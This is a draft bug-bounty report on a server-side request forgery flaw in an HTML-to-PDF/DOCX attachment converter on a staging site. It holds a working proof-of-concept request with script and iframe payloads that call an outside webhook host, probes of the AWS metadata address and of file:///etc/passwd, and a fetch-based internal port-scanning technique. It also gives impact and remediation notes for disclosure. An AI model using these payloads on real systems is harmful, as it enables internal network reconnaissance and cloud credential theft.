# BUG-006 (DRAFT): SSRF via HTML→PDF/DOCX attachment conversion (HeadlessChrome, JS execution, internal reachability)

**Status:** CONFIRMED (external callback + internal reachability + external readback). Not yet submitted.
**Severity recommendation:** P3 (functional SSRF with internal reachability oracle + external readback; IMDSv2 blocks credential theft)
**Target:** `https://bugbounty1.qe.optrostaging.ai` — `POST /api/v1/attachments/html`
**Reporter:** zeno0 (token 231), header `X-Optro-Bug-Bounty: zeno0` required.

## Summary

The authenticated endpoint `POST /api/v1/attachments/html` converts attacker-supplied HTML into a stored PDF or DOCX attachment. The conversion backend is **HeadlessChrome/155 (Skia/PDF)** running server-side, loads the HTML via `page.setContent()` (`about:blank` origin) and:

1. **Executes inline JavaScript** during rendering (confirmed — DOM writes painted into PDF, JS-initiated image loads observed).
2. **Fetches attacker-controlled external URLs** (confirmed — `webhook.site` GET callbacks from both `type:pdf` and `type:word` pipelines).
3. **Loads external `<script src>` and `<iframe src>` resources** (confirmed).
4. **Paints cross-origin iframe content into the PDF** (confirmed — `https://example.com/` body text rendered fully into the stored PDF, no CORS involved).
5. **Reaches AWS link-local metadata** — `http://169.254.169.254/latest/...` answered on all probed paths (root, ami-id, iam/security-credentials/, api/token) via no-cors fetch oracle.
6. Provides an **internal port/reachability oracle** (`fetch(...,{mode:'no-cors'})` resolves on any HTTP response, rejects on refused/DNS-fail, `AbortSignal.timeout` distinguishes filtered).

## Confirmed evidence (this session)

| Probe | Result |
| --- | --- |
| `<img src="https://webhook.site/d5ca52ae-.../wbimg-1794026058">` (pdf) | **GET callback received** 04:34:19 UTC |
| `<img src=".../word-img-1794026370">` (word/DOCX) | **GET callback received ×2** 04:39:31/32 UTC |
| `<script>` writes DOM / loads external script / JS `new Image()` | **executed** (`JSRUN-…` in PDF text; jsimg+extjs callbacks) |
| iframe `https://example.com/` | **full page text painted into stored PDF** (cross-origin readback, no CORS needed) |
| iframe `file:///etc/passwd`, `file:///etc/hostname` | blocked (Chrome origin policy) — empty |
| iframe `http://169.254.169.254/latest/meta-data/` | response exists (fetch REACHABLE) but **body empty when painted → IMDSv2-only (401 empty)** |
| fetch oracle: `169.254.169.254` root/ami-id/iam/security-credentials/api-token | **REACHABLE (HTTP response received)** |
| fetch oracle: `127.0.0.1` ports 80,443,3000,3001,5000,8000,8080,8081,8888,9222,9229,9200,5432,6379,27017 | all closed (no CDP 9222, no local app) |
| fetch oracle: `169.254.170.2` (ECS), `[fd00:ec2::254]` | timeout / refused |
| DNS fetch oracle: `kubernetes.default.svc` + 9 guessed service names | unresolvable/refused |
| XML/XXE DOCTYPE probe | treated as HTML, entities not parsed (no XXE surface) |

## Reproduction (Burp Repeater)

```
POST /api/v1/attachments/html HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
token: 231:<secret>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
Content-Type: application/json

{"html":"<html><head><title>ssrf-POC</title></head><body><h1>ssrf-poc</h1><img src=\"https://webhook.site/d5ca52ae-fe37-478e-9d77-7501ac90b9b2?ssrf=pdf\"><iframe src=\"https://example.com/\" style=\"width:900px;height:300px\"></iframe><script>new Image().src='https://webhook.site/d5ca52ae-fe37-478e-9d77-7501ac90b9b2?ssrf=js';</script></body></html>","type":"pdf","fileName":"ssrf-poc.pdf","attachableType":"Narrative","attachableId":62,"fileTags":["scoping-memo"]}
```

Response: `200 {"attachmentId":<id>,"fileName":"ssrf-poc.pdf","type":"file"}` →
`GET /api/v1/attachments/<id>` → `file_id` → `GET /api/v1/files/<file_id>` → presigned S3 URL → download PDF → observe painted external content + webhook callbacks.

Notes: `attachableType` accepts at least `Narrative` and `Policy` (and `OpsAuditItem` where writable); `type` accepts `pdf` and `word` (both pipelines fetch). Attachable must pass `ModelActionPermissionDenied` write ACL (write-scope required).

## Impact (stated honestly)

- An authenticated user can make the server issue **arbitrary HTTP(S) requests** (GET, plus any method/fetch the JS context allows) and **read back EXTERNAL response content into a persistent PDF stored in the application**.
- The renderer has network access to the **AWS link-local metadata service (169.254.169.254)**. IMDSv2-only config (empty 401 bodies) currently blocks token/credential theft, but the reachability confirms in-VPC placement of an internet-reachable rendering primitive.
- The no-cors fetch oracle yields a **full internal port scanner / service liveness oracle** from an internet foothold (distinguishes open/closed/filtered).
- If any internal HTTP service returns content without requiring CORS, or IMDSv1 exists elsewhere in the fleet, this becomes full read SSRF (P1/P2). Current confirmed ceiling: internal reachability + external readback + persistent artifact.

## Remediation suggestions

- Render HTML with a network-isolated renderer (deny link-local/IMDS ranges, egress allowlist to S3 only), `--disable-local-file-accesss` equivalent, no JS (`--disable-javascript`) if possible.
- Strip/neutralize scripts + remote resources before conversion; run renderer in dedicated locked-down subnet without metadata access (IMDSv2 + hop-limit already in place).

## Session artifacts

- `scripts/t009b_attach.py`, `t009b2_attach_narr.py`, `t009b3_ssrf_read.py`, `t009b4_diff.py`, `t009b5_iframes.py`, `t009b6_single.py`, `t009b7_calib.py`, `t009b8_oracle.py`, `t009b8b_oracle2.py`, `t009b9_origin.py`, `t009b10_ports.py`, `t009b11_k8s.py`, `t009b12_word.py`
- PDFs: `/tmp/zb7_EXAMPLE.pdf` (example.com painted), `/tmp/zb8b.pdf`, `/tmp/zb9.pdf`, `/tmp/zbC.pdf`
- webhook.site token: d5ca52ae-fe37-478e-9d77-7501ac90b9b2 (7 hits total, listed above)
